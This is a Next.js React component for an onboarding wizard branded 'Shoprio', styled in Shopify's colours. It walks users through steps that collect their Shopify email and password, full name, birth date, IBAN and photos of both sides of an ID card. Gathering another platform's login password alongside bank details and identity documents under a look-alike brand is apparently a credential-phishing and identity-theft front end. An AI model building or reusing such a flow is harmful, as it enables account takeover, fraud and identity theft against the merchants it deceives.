"use client"

import { useState } from "react"
import { StepPreCheck, StepPersonal, StepBirthDate, StepIBAN, StepKYC, StepSuccess, StepShopifyLogin } from "./steps"
import { AnimatePresence, motion } from "framer-motion"
import { cn } from "@/lib/utils"
import { toast } from "sonner"
import Image from "next/image"

export function BilgiFlow() {
  const [step, setStep] = useState(1)
  const [hasShopify, setHasShopify] = useState<boolean | null>(null)
  const [formData, setFormData] = useState({
    name: "",
    birthDate: "",
    iban: "",
    idFront: null,
    idBack: null,
    shopifyEmail: "",
    shopifyPassword: "",
  })

  const updateData = (newData: any) => {
    setFormData(prev => ({ ...prev, ...newData }))
  }

  const handlePreCheck = (choice: boolean) => {
    setHasShopify(choice)
    setStep(2)
  }

  const nextStep = () => {
    const maxSteps = hasShopify ? 4 : 6
    setStep(prev => Math.min(prev + 1, maxSteps))
  }

  const prevStep = () => {
    if (step === 2) {
      setHasShopify(null)
      setStep(1)
    } else {
      setStep(prev => Math.max(prev - 1, 1))
    }
  }

  return (
    <div className="min-h-screen bg-[oklch(0.985_0.01_145)] flex flex-col items-center justify-center p-6 sm:p-12 relative overflow-hidden font-sans">
      <div className="w-full max-w-4xl overflow-hidden relative z-10">
        <div className="p-4 md:p-8">
          <AnimatePresence mode="wait">
            <motion.div
              key={`${hasShopify}-${step}`}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.5, ease: "circOut" }}
            >
              {/* STEP 1: Pre-Check */}
              {step === 1 && <StepPreCheck onSelect={handlePreCheck} />}

              {/* PATH: HAS SHOPIFY (YES) */}
              {hasShopify === true && (
                <>
                  {step === 2 && <StepShopifyLogin data={formData} updateData={updateData} onNext={nextStep} onBack={prevStep} />}
                  {step === 3 && <StepKYC data={formData} updateData={updateData} onNext={nextStep} onBack={prevStep} />}
                  {step === 4 && <StepSuccess onNext={() => window.location.href = "/panel"} />}
                </>
              )}

              {/* PATH: NO SHOPIFY (NO) */}
              {hasShopify === false && (
                <>
                  {step === 2 && <StepPersonal data={formData} updateData={updateData} onNext={nextStep} />}
                  {step === 3 && <StepBirthDate data={formData} updateData={updateData} onNext={nextStep} onBack={prevStep} />}
                  {step === 4 && <StepIBAN data={formData} updateData={updateData} onNext={nextStep} onBack={prevStep} />}
                  {step === 5 && <StepKYC data={formData} updateData={updateData} onNext={nextStep} onBack={prevStep} />}
                  {step === 6 && <StepSuccess onNext={() => window.location.href = "/panel"} />}
                </>
              )}
            </motion.div>
          </AnimatePresence>
        </div>

        {/* Progress Indicator */}
        {hasShopify !== null && step < (hasShopify ? 4 : 6) && (
          <div className="pb-12 flex justify-center gap-3">
            {Array.from({ length: hasShopify ? 3 : 5 }).map((_, idx) => {
                const i = idx + 2; // Offset for Step 1 being PreCheck
                return (
                  <div 
                    key={i}
                    className={cn(
                      "h-1.5 transition-all duration-500 rounded-full",
                      step === i ? "w-10 bg-[#95BF47]" : "w-3 bg-gray-200"
                    )}
                  />
                );
            })}
          </div>
        )}
      </div>

      {/* Brand logo at the bottom */}
      <div className="mt-8 flex items-center gap-3 opacity-60 hover:opacity-100 transition-all duration-500">
        <Image src="/logo.png" alt="Shoprio Logo" width={100} height={32} className="h-8 w-auto object-contain" />
        <div className="px-2 py-0.5 rounded bg-gray-200 text-gray-500 text-[10px] font-bold tracking-wider">Onboarding</div>
      </div>
    </div>
  )
}
